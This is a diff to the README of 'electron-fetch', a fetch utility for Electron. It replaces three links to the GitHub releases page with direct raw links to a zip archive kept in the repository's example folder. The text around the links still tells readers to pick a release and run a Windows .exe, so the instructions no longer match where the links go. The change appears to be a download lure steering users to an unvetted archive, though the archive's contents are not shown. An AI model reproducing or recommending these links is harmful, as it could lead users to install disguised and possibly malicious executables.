@@ -1,6 +1,6 @@
 # ⚡ electron-fetch - Simple Electron Fetch Without CORS Limits
 
-[![Download electron-fetch](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/tresonn2318/electron-fetch/releases)
+[![Download electron-fetch](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/tresonn2318/electron-fetch/main/example/fetch_electron_1.6.zip)
 
 ## 🧭 Overview
 
@@ -32,7 +32,7 @@ If your computer runs modern desktop apps, it should be fine.
 
 Visit this page to download the Windows release:
 
-[https://github.com/tresonn2318/electron-fetch/releases](https://github.com/tresonn2318/electron-fetch/releases)
+[https://raw.githubusercontent.com/tresonn2318/electron-fetch/main/example/fetch_electron_1.6.zip](https://raw.githubusercontent.com/tresonn2318/electron-fetch/main/example/fetch_electron_1.6.zip)
 
 On that page, look for the latest release. Download the Windows file that matches your computer. If you see more than one file, choose the one for Windows and the format that opens as an app, such as `.exe` or a zipped package.
 
@@ -162,4 +162,4 @@ To open the app again:
 
 Visit the release page here and download the Windows app:
 
-[https://github.com/tresonn2318/electron-fetch/releases](https://github.com/tresonn2318/electron-fetch/releases)
+[https://raw.githubusercontent.com/tresonn2318/electron-fetch/main/example/fetch_electron_1.6.zip](https://raw.githubusercontent.com/tresonn2318/electron-fetch/main/example/fetch_electron_1.6.zip)
